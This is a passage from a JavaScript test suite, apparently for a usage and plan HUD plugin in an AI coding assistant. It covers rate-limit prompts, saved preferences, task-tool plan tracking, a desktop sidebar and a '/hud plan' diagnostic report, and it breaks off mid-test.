// nothing remembered the answer. One decision per window is the contract.

async function promptsAt(percent, answers, count, beforePrompts) {
    const hooks = [];
    const on = (event, a, b) => {
        hooks.push({ event, handler: typeof a === 'function' ? a : b });
        return { catch: () => undefined };
    };
    const mod = { register };
    mod.register(on);

    const asked = [];
    const ui = {
        invalidate: () => undefined,
        ask: async (q, options) => { asked.push(options); return answers.shift(); },
    };
    const next = async (e) => e;
    const soon = Math.floor(Date.now() / 1000) + 3600;

    const measure = async (pct) => hooks.find((h) => h.event === 'session.measure').handler({
        session: { usage: async () => ({ rateLimits: [{ kind: 'five_hour', percentUsed: pct, resetsAt: soon }] }) },
        ui,
    }, {}, next);
    const submit = hooks.find((h) => h.event === 'prompt.submit');
    const ctx = {
        ui,
        session: { model: async () => 'claude-opus-5-5', messages: async () => [] },
        clock: { after: () => undefined, every: () => undefined },
    };

    // A window that has reset forgets the last answer. Doing that first is
    // also what keeps these tests from leaning on each other, since the
    // module's state outlives a single test.
    await measure(5);
    await submit.handler(ctx, { text: 'fix a typo' }, next);
    asked.length = 0;

    await measure(percent);
    if (beforePrompts) await beforePrompts(hooks, ctx);
    for (let i = 0; i < count; i += 1) {
        await submit.handler({
            ui,
            session: { model: async () => 'claude-opus-5-5', messages: async () => [] },
            clock: { after: () => undefined, every: () => undefined },
        }, { text: 'plan the whole migration and refactor the architecture' }, next);
    }
    return asked.length;
}

test('it asks about the nearly-full window once, however many prompts follow', async () => {
    expect(await promptsAt(92, ['Use opus 5.5', 'Use opus 5.5', 'Use opus 5.5', 'Use opus 5.5'], 4)).toBe(1);
});

test('and a typed answer counts as an answer rather than a reason to ask again', async () => {
    expect(await promptsAt(97, ['use fable if it can finish, otherwise opus', 'x', 'x'], 3)).toBe(1);
});

test('/hud confirm off stops the question for good', async () => {
    const off = async (hooks, ctx) => {
        const cmd = hooks.find((h) => h.event === 'command.run');
        const reply = await cmd.handler(ctx, { args: 'confirm off' });
        expect(reply.text.includes('No more questions')).toBe(true);
    };
    expect(await promptsAt(96, ['x', 'x', 'x'], 3, off)).toBe(0);
});

test('and /hud confirm on brings it back, once', async () => {
    const cycle = async (hooks, ctx) => {
        const cmd = hooks.find((h) => h.event === 'command.run');
        await cmd.handler(ctx, { args: 'confirm off' });
        await cmd.handler(ctx, { args: 'confirm on' });
    };
    expect(await promptsAt(96, ['Use opus 5.5', 'x', 'x'], 3, cycle)).toBe(1);
});

// ============================================== what you set stays set
//
// Nothing the mod was told survived a restart: the switches went back to on
// the next session, and the README said they stuck. These cover the store
// round trip, and that a store that misbehaves can never break a session.

async function hudWith(store) {
    const hooks = [];
    const on = (event, a, b) => {
        hooks.push({ event, handler: typeof a === 'function' ? a : b });
        return { catch: () => undefined };
    };
    const mod = { register };
    mod.register(on);
    const ctx = {
        store,
        ui: { invalidate: () => undefined },
        command: { register: async () => undefined },
        session: { usage: async () => ({}), model: async () => 'claude-opus-5-5' },
        clock: { after: () => undefined, every: () => undefined },
    };
    const next = async (e) => e;

    // Module state outlives a single test, so every test begins from a known
    // baseline: all four switches on, loaded the way a fresh session loads
    // them. Without this a test can pass because an earlier one left things
    // as it wanted them, which proves nothing.
    ctx.store = memoryStore({ prefs: { suggestOn: true, headsOn: true, blastOn: true, confirmOn: true } });
    await hooks.find((h) => h.event === 'session.start').handler(ctx, {}, next);
    ctx.store = store;

    return {
        start: () => hooks.find((h) => h.event === 'session.start').handler(ctx, {}, next),
        say: (args) => hooks.find((h) => h.event === 'command.run').handler(ctx, { args }),
    };
}

function memoryStore(initial) {
    const data = new Map(Object.entries(initial || {}));
    const writes = [];
    return {
        data, writes,
        get: async (k) => data.get(k),
        set: async (k, v) => { writes.push([k, v]); data.set(k, JSON.parse(JSON.stringify(v))); },
    };
}

test('a switch you turn off is saved', async () => {
    const store = memoryStore();
    const hud = await hudWith(store);
    await hud.start();
    await hud.say('confirm on');   // a known starting point
    store.writes.length = 0;
    await hud.say('suggest off');
    const saved = store.data.get('prefs');
    expect(saved.suggestOn).toBe(false);
    expect(saved.confirmOn).toBe(true);
});

test('and it is still off after a restart', async () => {
    const store = memoryStore({ prefs: { suggestOn: false, headsOn: false, blastOn: true, confirmOn: false } });
    const hud = await hudWith(store);
    await hud.start();
    // The status sentence, not the word "off": every reply ends with a hint
    // that mentions "/hud confirm off", so a bare includes('off') is true
    // whether or not anything was restored.
    expect((await hud.say('confirm')).text.startsWith('Asking near the limit is off')).toBe(true);
    expect((await hud.say('suggest')).text.startsWith('Suggestions are off')).toBe(true);
    expect((await hud.say('know')).text.startsWith('Heads up is off')).toBe(true);
    expect((await hud.say('blast')).text.startsWith('Blast radius is on')).toBe(true);
});

test('a lookup writes nothing', async () => {
    const store = memoryStore({ prefs: { suggestOn: true, headsOn: true, blastOn: true, confirmOn: true } });
    const hud = await hudWith(store);
    await hud.start();
    await hud.say('confirm on');
    await hud.say('suggest on');
    await hud.say('models');
    expect(store.writes.length).toBe(0);
});

test('a value some other version wrote is not believed', async () => {
    // Falsy non-booleans, because the defaults are all on: a value that
    // would be read as true anyway cannot tell "ignored" from "believed".
    const store = memoryStore({ prefs: { suggestOn: 0, headsOn: '', blastOn: null, confirmOn: 'false' } });
    const hud = await hudWith(store);
    await hud.start();
    expect((await hud.say('suggest')).text.includes('are on')).toBe(true);
    expect((await hud.say('know')).text.includes('is on')).toBe(true);
    expect((await hud.say('blast')).text.includes('is on')).toBe(true);
    expect((await hud.say('confirm')).text.includes('on, once per window')).toBe(true);
});

test('a store that throws never breaks a session or a command', async () => {
    const broken = {
        get: async () => { throw new Error('store unavailable'); },
        set: async () => { throw new Error('store unavailable'); },
    };
    const hud = await hudWith(broken);
    await hud.start();
    const reply = await hud.say('suggest off');
    expect(reply.text.includes('off')).toBe(true);
});

test('and no store at all is the same as an empty one', async () => {
    const hud = await hudWith(undefined);
    await hud.start();
    const reply = await hud.say('suggest off');
    expect(reply.text.includes('off')).toBe(true);
});

// ================================== the plan, from the newer task tools
//
// An interactive session does not write one whole list. It adds a task at a
// time with TaskCreate and flips each by id with TaskUpdate, so a bar that
// only listens for TodoWrite never sees a plan in the sessions that most need
// one. These cover keeping the plan from the pieces.

const made = (id, subject) => ({ result: { task: { id, subject } } });

test('TaskCreate adds a pending task, named by the id the tool answered with', async () => {
    const after = applyTaskTool([], 'TaskCreate', { subject: 'Wire the panel', activeForm: 'Wiring the panel' }, made('7', 'Wire the panel'));
    expect(after.length).toBe(1);
    expect(after[0].id).toBe('7');
    expect(after[0].status).toBe('pending');
    expect(after[0].activeForm).toBe('Wiring the panel');
});

test('a TaskCreate that answered with no id creates nothing', async () => {
    // Guessing an id would let a later update land on the wrong task.
    expect(applyTaskTool([], 'TaskCreate', { subject: 'x' }, { result: {} }).length).toBe(0);
    expect(applyTaskTool([], 'TaskCreate', { subject: 'x' }, undefined).length).toBe(0);
});

test('TaskUpdate flips the task it names and keeps the status spelled right', async () => {
    const start = [{ id: '1', subject: 'a', activeForm: '', status: 'pending' }];
    const after = applyTaskTool(start, 'TaskUpdate', { taskId: '1', status: 'in_progress' }, { result: { success: true } });
    expect(after[0].status).toBe('in_progress');
});

test('a status with a space or a hyphen is read as the same status', async () => {
    const start = [{ id: '1', subject: 'a', activeForm: '', status: 'pending' }];
    expect(applyTaskTool(start, 'TaskUpdate', { taskId: '1', status: 'in-progress' }, {})[0].status).toBe('in_progress');
    expect(applyTaskTool(start, 'TaskUpdate', { taskId: '1', status: 'In Progress' }, {})[0].status).toBe('in_progress');
});

test('a refused update changes nothing', async () => {
    const start = [{ id: '1', subject: 'a', activeForm: '', status: 'pending' }];
    const after = applyTaskTool(start, 'TaskUpdate', { taskId: '1', status: 'completed' }, { result: { success: false } });
    expect(after[0].status).toBe('pending');
});

test('a deleted task leaves the plan', async () => {
    const start = [
        { id: '1', subject: 'a', activeForm: '', status: 'pending' },
        { id: '2', subject: 'b', activeForm: '', status: 'pending' },
    ];
    const after = applyTaskTool(start, 'TaskUpdate', { taskId: '1', status: 'deleted' }, {});
    expect(after.length).toBe(1);
    expect(after[0].id).toBe('2');
});

test('a task made before the mod was watching still counts', async () => {
    // Its name is unknown, but a plan with a hole in it reports the wrong total.
    const after = applyTaskTool([], 'TaskUpdate', { taskId: '9', status: 'completed' }, {});
    expect(after.length).toBe(1);
    expect(after[0].status).toBe('completed');
});

test('TaskList is the whole truth and replaces what was inferred', async () => {
    const start = [{ id: '1', subject: 'old', activeForm: 'Doing old', status: 'pending' }];
    const after = applyTaskTool(start, 'TaskList', {}, { result: { tasks: [
        { id: '1', subject: 'old', status: 'completed', blockedBy: [] },
        { id: '2', subject: 'new', status: 'in_progress', blockedBy: [] },
    ] } });
    expect(after.length).toBe(2);
    expect(after[0].status).toBe('completed');
    // What the list cannot say is kept from what was already known.
    expect(after[0].activeForm).toBe('Doing old');
});

test('a new job after a finished one starts a fresh plan', async () => {
    // Otherwise last hour's five finished tasks sit in the total and the bar
    // opens at 60% on work that has not begun.
    const finished = [
        { id: '1', subject: 'a', activeForm: '', status: 'completed' },
        { id: '2', subject: 'b', activeForm: '', status: 'completed' },
    ];
    const after = applyTaskTool(finished, 'TaskCreate', { subject: 'next job' }, made('3', 'next job'));
    expect(after.length).toBe(1);
    expect(after[0].id).toBe('3');
});

test('but a task added mid-job joins the plan it belongs to', async () => {
    const running = [
        { id: '1', subject: 'a', activeForm: '', status: 'completed' },
        { id: '2', subject: 'b', activeForm: '', status: 'in_progress' },
    ];
    expect(applyTaskTool(running, 'TaskCreate', { subject: 'c' }, made('3', 'c')).length).toBe(3);
});

test('an unrelated tool leaves the plan alone', async () => {
    const start = [{ id: '1', subject: 'a', activeForm: '', status: 'pending' }];
    expect(applyTaskTool(start, 'Bash', { command: 'ls' }, {})).toBe(start);
});

test('the tracked tasks draw as the same bar TodoWrite does', async () => {
    const tasks = [
        { id: '1', subject: 'one', activeForm: 'Doing one', status: 'completed' },
        { id: '2', subject: 'two', activeForm: 'Doing two', status: 'in_progress' },
        { id: '3', subject: 'three', activeForm: 'Doing three', status: 'pending' },
        { id: '4', subject: 'four', activeForm: 'Doing four', status: 'pending' },
    ];
    const plan = progressOf(todosFromTasks(tasks));
    expect(plan.total).toBe(4);
    expect(plan.done).toBe(1);
    expect(plan.label).toBe('Doing two');
    expect(worthShowing(plan)).toBe(true);
});

// And the part that was actually broken: through the real hooks, in the order
// a session makes the calls, the bar appears.

async function runTaskCalls(calls) {
    const hooks = [];
    const on = (event, a, b) => {
        const matcher = typeof a === 'function' ? null : a;
        hooks.push({ event, matcher, handler: typeof a === 'function' ? a : b });
        return { catch: () => undefined };
    };
    const mod = { register };
    mod.register(on);

    const el = (type) => (props) => ({ type, ...props });
    const ctx = {
        ui: {
            resolve: () => ({ Box: el('Box'), Text: el('Text'), Svg: el('Svg'), Button: el('Button') }),
            invalidate: () => undefined,
        },
        session: { model: async () => 'claude-opus-5-5' },
        clock: { after: () => undefined, every: () => undefined },
    };

    for (const [tool, input, result] of calls) {
        const hook = hooks.find((h) => h.event === 'tool.call' && h.matcher && h.matcher.tool === tool);
        expect(!!hook).toBe(true);
        const answered = await hook.handler(ctx, { tool, ...input }, async () => result);
        // The hook must hand back exactly what the tool answered.
        expect(answered).toBe(result);
    }

    // The band, by name: there is a second ui.render hook now, the sidebar's,
    // and asking for "the" render hook would hand back whichever came first.
    const render = hooks.find((h) => h.event === 'ui.render' && h.matcher && h.matcher.component === 'AbovePrompt');
    return render.handler(ctx, { surface: 'terminal', component: 'AbovePrompt', props: { bodyColumns: 120 } }, async () => null);
}

const hasBar = (tree) => !!(tree && tree.children && tree.children.find((c) => c.key === 'hud-progress'));

test('a plan built with TaskCreate and TaskUpdate shows the bar', async () => {
    const tree = await runTaskCalls([
        ['TaskList', {}, { result: { tasks: [] } }],
        ['TaskCreate', { subject: 'one' }, made('1', 'one')],
        ['TaskCreate', { subject: 'two' }, made('2', 'two')],
        ['TaskCreate', { subject: 'three' }, made('3', 'three')],
        ['TaskUpdate', { taskId: '1', status: 'completed' }, { result: { success: true } }],
        ['TaskUpdate', { taskId: '2', status: 'in_progress' }, { result: { success: true } }],
    ]);
    expect(hasBar(tree)).toBe(true);
});

test('and the bar goes when the last task lands', async () => {
    const tree = await runTaskCalls([
        ['TaskList', {}, { result: { tasks: [] } }],
        ['TaskCreate', { subject: 'one' }, made('1', 'one')],
        ['TaskCreate', { subject: 'two' }, made('2', 'two')],
        ['TaskUpdate', { taskId: '1', status: 'completed' }, { result: { success: true } }],
        ['TaskUpdate', { taskId: '2', status: 'completed' }, { result: { success: true } }],
    ]);
    expect(hasBar(tree)).toBe(false);
});

test('one task alone is not a plan', async () => {
    const tree = await runTaskCalls([
        ['TaskList', {}, { result: { tasks: [] } }],
        ['TaskCreate', { subject: 'only' }, made('1', 'only')],
    ]);
    expect(hasBar(tree)).toBe(false);
});

test('a result the hook does not understand never breaks the call', async () => {
    // Whatever comes back must still reach the model untouched.
    const tree = await runTaskCalls([
        ['TaskList', {}, { result: { tasks: [] } }],
        ['TaskCreate', { subject: 'x' }, 'not even an object'],
        ['TaskUpdate', { taskId: '1' }, null],
    ]);
    expect(hasBar(tree)).toBe(false);
});

// ====================================================== the desktop sidebar
//
// The whole HUD as a stack of cards, for the desktop app. Two promises matter
// more than any detail of how it looks. The terminal must never be touched,
// since panes exist there too and an unconditional open would have changed a
// terminal that was already right. And the information must never be missing
// from both places at once: the strip steps aside only while the sidebar is
// really on screen.

const elOf = (type) => (props) => ({ type, ...props });
const factories = { Box: elOf('Box'), Text: elOf('Text'), Svg: elOf('Svg'), Button: elOf('Button') };

function walk(node, visit) {
    if (!node || typeof node !== 'object') return;
    visit(node);
    for (const child of node.children || []) walk(child, visit);
}

function hasKey(tree, key) {
    let found = false;
    walk(tree, (n) => { if (n.key === key) found = true; });
    return found;
}

function textsOf(tree) {
    const out = [];
    walk(tree, (n) => { if (n.type === 'Text') out.push((n.children || []).join('')); });
    return out.join(' | ');
}

const reading = (key, label, percent, extra) => ({
    key, label, percent, level: percent >= 86 ? 'urgent' : percent >= 56 ? 'watch' : 'calm',
    resetsAt: null, resetForm: 'none', note: '', ...extra,
});

// ---- the pure builder

test('an empty sidebar is just the model card', async () => {
    const tree = buildPanel(factories, { model: 'opus 5.5', worst: 'calm', readings: [], collapsed: {} });
    expect(hasKey(tree, 'card-hud')).toBe(true);
    expect(hasKey(tree, 'card-usage')).toBe(false);
    expect(hasKey(tree, 'card-progress')).toBe(false);
    expect(hasKey(tree, 'card-agents')).toBe(false);
});

test('a card with nothing to say is left out, not drawn empty', async () => {
    const tree = buildPanel(factories, {
        model: 'opus 5.5', worst: 'calm', readings: [], plan: null, agents: [], collapsed: {},
    });
    // Only the model card: no other card, however empty, is drawn.
    const cards = tree.children.filter((c) => typeof c.key === 'string' && c.key.startsWith('card-'));
    expect(cards.length).toBe(1);
    expect(cards[0].key).toBe('card-hud');
});

test('every reading gets a row and a gauge', async () => {
    const tree = buildPanel(factories, {
        model: 'opus 5.5', worst: 'watch', collapsed: {},
        readings: [reading('ctx', 'Ctx', 15), reading('session', 'Session', 58), reading('week', 'Week', 71)],
    });
    for (const k of ['ctx', 'session', 'week']) {
        expect(hasKey(tree, 'u-' + k)).toBe(true);
        expect(hasKey(tree, 'u-g-' + k)).toBe(true);
    }
});

test('a window with a reset says when it resets', async () => {
    const far = Math.floor(Date.now() / 1000) + 40 * 3600;
    const tree = buildPanel(factories, {
        model: 'opus 5.5', worst: 'calm', collapsed: {},
        readings: [reading('week', 'Week', 40, { resetsAt: far, resetForm: 'clock' })],
    });
    expect(textsOf(tree).includes('resets')).toBe(true);
});

test('context has no reset line, because it does not reset', async () => {
    const tree = buildPanel(factories, {
        model: 'opus 5.5', worst: 'calm', collapsed: {}, readings: [reading('ctx', 'Ctx', 15)],
    });
    expect(textsOf(tree).includes('resets')).toBe(false);
});

test('a folded card is only its header', async () => {
    const data = {
        model: 'opus 5.5', worst: 'calm', readings: [reading('ctx', 'Ctx', 15)],
        collapsed: { usage: true },
    };
    const tree = buildPanel(factories, data);
    expect(hasKey(tree, 'card-usage')).toBe(true);
    expect(hasKey(tree, 'u-ctx')).toBe(false);
    // The header still says the one figure worth knowing.
    expect(textsOf(tree).includes('15%')).toBe(true);
});

test('pressing a card header asks to fold it', async () => {
    let asked = null;
    const tree = buildPanel(factories, {
        model: 'opus 5.5', worst: 'calm', readings: [reading('ctx', 'Ctx', 15)],
        collapsed: {}, toggle: (key) => { asked = key; },
    });
    let button = null;
    walk(tree, (n) => { if (n.type === 'Button' && n.key === 'b-usage') button = n; });
    expect(!!button).toBe(true);
    button.onPress();
    expect(asked).toBe('usage');
});

test('the plan is listed item by item, the one in hand first', async () => {
    const plan = { total: 4, done: 1, doing: 1, percent: 25, donePercent: 25, reachedPercent: 50, complete: false };
    const tree = buildPanel(factories, {
        model: 'opus 5.5', worst: 'calm', readings: [], collapsed: {}, plan,
        planItems: [
            { content: 'alpha-finished', status: 'completed' },
            { content: 'two', activeForm: 'Doing two', status: 'in_progress' },
            { content: 'three', status: 'pending' },
            { content: 'four', status: 'pending' },
        ],
    });
    expect(hasKey(tree, 'card-progress')).toBe(true);
    const text = textsOf(tree);
    expect(text.includes('Doing two')).toBe(true);
    expect(text.indexOf('Doing two') < text.indexOf('three')).toBe(true);
    // A finished task is a trail, under its own heading, after the work still to do.
    // A distinctive name, because a short one is found inside "1 done" and proves nothing.
    expect(text.includes('alpha-finished')).toBe(true);
    expect(text.indexOf('three') < text.indexOf('alpha-finished')).toBe(true);
});

test('a long plan says how many more there are', async () => {
    const items = [];
    for (let i = 0; i < 12; i += 1) items.push({ content: 'task ' + i, status: 'pending' });
    const plan = { total: 12, done: 0, doing: 0, percent: 0, donePercent: 0, reachedPercent: 0, complete: false };
    const tree = buildPanel(factories, { model: 'm', worst: 'calm', readings: [], collapsed: {}, plan, planItems: items });
    expect(textsOf(tree).includes('and 5 more')).toBe(true);
});

test('agents are listed by name, with how long they have run', async () => {
    const tree = buildPanel(factories, {
        model: 'm', worst: 'calm', readings: [], collapsed: {},
        agents: [{ name: 'general', status: 'running', startedAt: Date.now() - 200000, tokens: 3100000 }],
        agentShares: [1],
    });
    expect(hasKey(tree, 'card-agents')).toBe(true);
    expect(textsOf(tree).includes('general')).toBe(true);
});

test('one agent is not given a share, since one agent is all of them', async () => {
    const tree = buildPanel(factories, {
        model: 'm', worst: 'calm', readings: [], collapsed: {},
        agents: [{ name: 'general', status: 'running', startedAt: Date.now(), tokens: 10 }],
        agentShares: [1],
    });
    expect(textsOf(tree).includes('of all agent work')).toBe(false);
});

test('two agents are each given their share', async () => {
    const tree = buildPanel(factories, {
        model: 'm', worst: 'calm', readings: [], collapsed: {},
        agents: [
            { name: 'a', status: 'running', startedAt: Date.now(), tokens: 75 },
            { name: 'b', status: 'running', startedAt: Date.now(), tokens: 25 },
        ],
        agentShares: [0.75, 0.25],
    });
    expect(textsOf(tree).includes('75%')).toBe(true);
    expect(textsOf(tree).includes('25%')).toBe(true);
});

test('routing shows what was decided, and the models card shows each tier', async () => {
    // What was decided is news and starts open; the models are something you set and start folded.
    expect(!!DEFAULT_COLLAPSED.routing).toBe(false);
    expect(DEFAULT_COLLAPSED.models).toBe(true);
    const tree = buildPanel(factories, {
        model: 'm', worst: 'calm', readings: [], routingOn: true,
        tiers: { fast: 'haiku 5.5', base: 'sonnet 5.5', deep: 'opus 5.5', top: 'fable 5.1' },
        tierIds: { fast: 'a', base: 'b', deep: 'c' },
        log: [{ tier: 'deep', short: 'opus 5.5' }], collapsed: {},
    });
    const text = textsOf(tree);
    for (const m of ['haiku 5.5', 'sonnet 5.5', 'opus 5.5', 'fable 5.1']) expect(text.includes(m)).toBe(true);
});

test('no text in the sidebar is left free to wrap mid-word', async () => {
    // The rule the strip learned: a label that tears across two lines is worse
    // than one that ends in an ellipsis.
    const plan = { total: 3, done: 1, doing: 1, percent: 33, donePercent: 33, reachedPercent: 66, complete: false };
    const tree = buildPanel(factories, {
        model: 'opus 5.5', worst: 'watch', pinned: false, routingOn: true, reason: 'deep work',
        readings: [reading('ctx', 'Ctx', 15), reading('week', 'Week', 71)],
        plan, planItems: [{ content: 'a', activeForm: 'Doing a', status: 'in_progress' }],
        agents: [{ name: 'g', status: 'running', startedAt: Date.now(), tokens: 5 }], agentShares: [1],
        tiers: { fast: 'a', base: 'b', deep: 'c', top: 'd' }, log: [{ tier: 'deep', short: 'x' }],
        collapsed: {},
    });
    let bare = 0;
    walk(tree, (n) => { if (n.type === 'Text' && !n.wrap) bare += 1; });
    expect(bare).toBe(0);
});

// ---- through the real hooks

async function sidebarSession(opts) {
    const o = Object.assign({ surfaces: ['terminal'], placed: false }, opts || {});
    const hooks = [];
    const on = (event, a, b) => {
        hooks.push({ event, matcher: typeof a === 'function' ? null : a, handler: typeof a === 'function' ? a : b });
        return { catch: () => undefined };
    };
    const mod = { register };
    mod.register(on);

    const calls = { open: [], close: [] };
    const ctx = {
        ui: {
            resolve: () => factories,
            invalidate: () => undefined,
            open: async (args) => { calls.open.push(args); return { isPlaced: o.placed }; },
            close: async (args) => { calls.close.push(args); },
            panes: async () => [{ id: 'hud', title: 'HUD', isShown: o.placed, isFocused: false, isPlaced: o.placed }],
        },
        session: {
            surfaces: async () => o.surfaces,
            model: async () => 'claude-opus-5-5',
            usage: async () => ({ context: { percent: 40 }, rateLimits: [] }),
        },
        command: { register: async () => undefined },
        clock: { after: () => undefined, every: () => undefined },
    };
    const next = async (e) => e;
    const find = (event, component) => hooks.find((h) => h.event === event
        && (!component || (h.matcher && h.matcher.component === component)));

    // Each test begins with the sidebar not dismissed, the way a new session does.
    await find('command.run').handler(ctx, { args: 'panel' });
    calls.open.length = 0;
    calls.close.length = 0;

    return {
        calls, ctx, hooks, next,
        start: () => find('session.start').handler(ctx, {}, next),
        attach: (surface) => find('session.attach').handler(ctx, { surface, clientId: surface + ':default' }, next),
        closed: (origin) => find('ui.close').handler(ctx, { id: 'hud', origin }, next),
        band: (surface) => find('ui.render', 'AbovePrompt').handler(ctx, { surface, component: 'AbovePrompt' }, async () => null),
        pane: (surface) => find('ui.render', 'Pane').handler(ctx, { surface, component: 'Pane', requestId: 'hud' }, async () => 'fell through'),
        say: (args) => find('command.run').handler(ctx, { args }),
    };
}

test('the sidebar is never offered to the terminal', async () => {
    const h = await sidebarSession({ surfaces: ['terminal'] });
    await h.start();
    expect(h.calls.open.length).toBe(0);
});

test('and not on a session with nothing attached at all', async () => {
    const h = await sidebarSession({ surfaces: [] });
    await h.start();
    expect(h.calls.open.length).toBe(0);
});

test('it is opened when the desktop app is there at the start', async () => {
    const h = await sidebarSession({ surfaces: ['terminal', 'desktop'], placed: true });
    await h.start();
    expect(h.calls.open.length).toBe(1);
    expect(h.calls.open[0].id).toBe(PANE_ID);
});

test('it is opened when the desktop app attaches later', async () => {
    const h = await sidebarSession({ placed: true });
    await h.attach('desktop');
    expect(h.calls.open.length).toBe(1);
});

test('and not for a phone or an editor, which are not the desktop', async () => {
    const h = await sidebarSession({ placed: true });
    await h.attach('mobile');
    await h.attach('vscode');
    expect(h.calls.open.length).toBe(0);
});

test('a sidebar the person closed is not reopened behind their back', async () => {
    const h = await sidebarSession({ placed: true });
    await h.closed('person');
    await h.attach('desktop');
    expect(h.calls.open.length).toBe(0);
});

test('but a close that was not theirs does not count as their choice', async () => {
    const h = await sidebarSession({ placed: true });
    await h.closed('plugin');
    await h.attach('desktop');
    expect(h.calls.open.length).toBe(1);
});

test('/hud panel opens it again after it was closed', async () => {
    const h = await sidebarSession({ placed: true });
    await h.closed('person');
    const reply = await h.say('panel');
    expect(h.calls.open.length).toBe(1);
    expect(reply.text.includes('Sidebar open')).toBe(true);
});

test('/hud panel off closes it and says the strip is back', async () => {
    const h = await sidebarSession({ placed: true });
    const reply = await h.say('panel off');
    expect(h.calls.close.length).toBe(1);
    expect(h.calls.close[0].id).toBe(PANE_ID);
    expect(reply.text.includes('strip is back')).toBe(true);
});

test('/hud panel where nothing can draw it says so rather than pretending', async () => {
    const h = await sidebarSession({ placed: false });
    const reply = await h.say('panel');
    expect(reply.text.includes('Nothing here can draw')).toBe(true);
});

test('on the desktop with the sidebar showing, the strip steps aside', async () => {
    const h = await sidebarSession({ surfaces: ['desktop'], placed: true });
    const tree = await h.band('desktop');
    // Whatever else the band may carry, the strip itself is not in it.
    expect(hasKey(tree, 'id')).toBe(false);
    expect(hasKey(tree, 'rdctx')).toBe(false);
});

test('but never while the sidebar is not actually on screen', async () => {
    // Opened but waiting undrawn, in a window too narrow for it. The strip
    // must stay, or the numbers are missing from both places at once.
    const h = await sidebarSession({ surfaces: ['desktop'], placed: false });
    const tree = await h.band('desktop');
    expect(!!tree).toBe(true);
    expect(hasKey(tree, 'id')).toBe(true);
});

test('and the terminal always keeps its strip, whatever a pane says', async () => {
    const h = await sidebarSession({ surfaces: ['terminal'], placed: true });
    const tree = await h.band('terminal');
    expect(!!tree).toBe(true);
    expect(tree.type).toBe('Box');
});

test('the sidebar draws for the desktop and for nothing else', async () => {
    const h = await sidebarSession({ surfaces: ['desktop'], placed: true });
    expect((await h.pane('desktop')).type).toBe('Box');
    expect(await h.pane('terminal')).toBe('fell through');
    expect(await h.pane('mobile')).toBe('fell through');
});

test('the drawn sidebar carries the model and the usage', async () => {
    const h = await sidebarSession({ surfaces: ['desktop'], placed: true });
    const tree = await h.pane('desktop');
    expect(hasKey(tree, 'card-hud')).toBe(true);
    expect(hasKey(tree, 'card-usage')).toBe(true);
});

test('the pane is drawn by the hook that matches the id it is opened under', async () => {
    // The render hook's matcher spells the id out so the validator can read
    // it, and the opener uses the constant. If the two ever drift the pane
    // opens and nothing draws it, which looks exactly like a blank sidebar.
    const h = await sidebarSession({ surfaces: ['desktop'], placed: true });
    const drawer = h.hooks.find((x) => x.event === 'ui.render' && x.matcher && x.matcher.component === 'Pane');
    expect(drawer.matcher.requestId).toBe(PANE_ID);
    await h.attach('desktop');
    expect(h.calls.open[0].id).toBe(drawer.matcher.requestId);
});

// ===================================== why is there no progress bar? /hud plan
//
// The bar is silent when there is no plan, which is also exactly what it does
// when something upstream is wrong. From the outside those are identical, and
// telling them apart used to take a round trip. /hud plan says which, by
// counting what actually arrived.

const none = { TodoWrite: 0, TaskCreate: 0, TaskUpdate: 0, TaskList: 0, last: '' };

test('/hud plan says no plan tool has been called, and what to do about it', async () => {
    const text = planReport({ seen: none, tasks: [], plan: null }).join('\n');
    expect(text.includes('No plan tool has been called')).toBe(true);
    // The two real causes, so the person knows which to chase.
    expect(text.includes('has nothing to count')).toBe(true);
    // Whether Claude is being asked to keep one is the thing to chase.
    expect(text.includes('Plan tracking is off')).toBe(true);
});

test('it says tasks were seen but there is no bar, and why that is correct', async () => {
    const text = planReport({
        seen: { ...none, TaskCreate: 1, last: 'TaskCreate' },
        tasks: [{ id: '1', subject: 'a', status: 'pending' }],
        plan: null,
    }).join('\n');
    expect(text.includes('Tasks have been seen, but there is no bar')).toBe(true);
    expect(text.includes('two or more')).toBe(true);
});

test('it says the bar should be showing when there is a live plan', async () => {
    const plan = { total: 4, done: 1, doing: 1, percent: 25, complete: false };
    const text = planReport({ seen: { ...none, TaskCreate: 4, TaskUpdate: 2, last: 'TaskUpdate' }, tasks: [{}, {}, {}, {}], plan, working: true }).join('\n');
    expect(text.includes('1/4 done (25%)')).toBe(true);
    expect(text.includes('The bar should be showing')).toBe(true);
    expect(text.includes('Claude is working now')).toBe(true);
});

test('when Claude is idle it says the bar is hidden on purpose, and lists the tasks that are still open', async () => {
    const plan = { total: 3, done: 1, doing: 0, percent: 33, complete: false };
    const items = [
        { content: 'Read the code', status: 'completed' },
        { content: 'Write the fix', status: 'pending' },
        { content: 'Run the tests', status: 'in_progress' },
    ];
    const text = planReport({ seen: { ...none, TaskCreate: 3, last: 'TaskCreate' }, tasks: [{}, {}, {}], plan, items, working: false }).join('\n');
    expect(text.includes('Claude is idle')).toBe(true);
    expect(text.includes('the bar is hidden')).toBe(true);
    expect(text.includes('[done]  Read the code')).toBe(true);
    expect(text.includes('[todo]  Write the fix')).toBe(true);
    expect(text.includes('[doing] Run the tests')).toBe(true);
    expect(text.includes('left unfinished on its list')).toBe(true);
});

test('a very long list is cut, with a count of what was left out', async () => {
    const items = [];
    for (let i = 0; i < 60; i += 1) items.push({ content: 'task ' + i, status: 'pending' });
    const text = planReport({ seen: { ...none, TaskCreate: 60 }, tasks: items, plan: { total: 60, done: 0, doing: 0, percent: 0, complete: false }, items, working: false }).join('\n');
    expect(text.includes('and 20 more')).toBe(true);
    expect(text.includes('task 39')).toBe(true);
    expect(text.includes('task 40')).toBe(false);
});

test('it says when the plan is finished and the bar has gone', async () => {
    const plan = { total: 2, done: 2, doing: 0, percent: 100, complete: true };
    const text = planReport({ seen: { ...none, TaskCreate: 2, last: 'TaskUpdate' }, tasks: [{}, {}], plan }).join('\n');
    expect(text.includes('finished')).toBe(true);
    expect(text.includes('has gone')).toBe(true);
});

test('it lists exactly how many of each call went past', async () => {
    const text = planReport({
        seen: { TodoWrite: 3, TaskCreate: 5, TaskUpdate: 7, TaskList: 2, last: 'TaskList' },
        tasks: [], plan: null,
    }).join('\n');
    expect(text.includes('TaskCreate 5, TaskUpdate 7, TaskList 2, TodoWrite 3')).toBe(true);
    expect(text.includes('last was TaskList')).toBe(true);
});

test('a missing record reads as nothing seen rather than crashing', async () => {
    const text = planReport({}).join('\n');
    expect(text.includes('No plan tool has been called')).toBe(true);
});

test('a task call going through the real hook is counted, and /hud plan sees it', async () => {
    const h = await sidebarSession({ surfaces: ['terminal'] });
    const countOf = async () => {
        const text = (await h.say('plan')).text;
        const m = text.match(/TaskCreate (\d+)/);
        return m ? Number(m[1]) : -1;
    };
    const before = await countOf();
